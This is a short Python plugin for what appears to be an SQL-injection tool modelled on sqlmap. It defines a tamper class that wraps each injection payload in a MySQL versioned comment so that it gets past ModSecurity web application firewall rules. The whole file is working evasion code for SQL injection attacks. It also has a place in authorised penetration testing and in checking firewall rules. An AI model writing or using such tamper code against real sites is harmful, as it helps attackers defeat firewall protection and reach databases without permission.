from sqldark.tamper import Tamper, register
@register
class ModSecurityVersioned(Tamper):
    name="modsecurityversioned"
    description="Embed the whole query in a versioned comment to bypass ModSecurity"
    def tamper(self,p):
        if p.strip().startswith(("'",'"')): return p
        return f"/*!00000{p}*/"
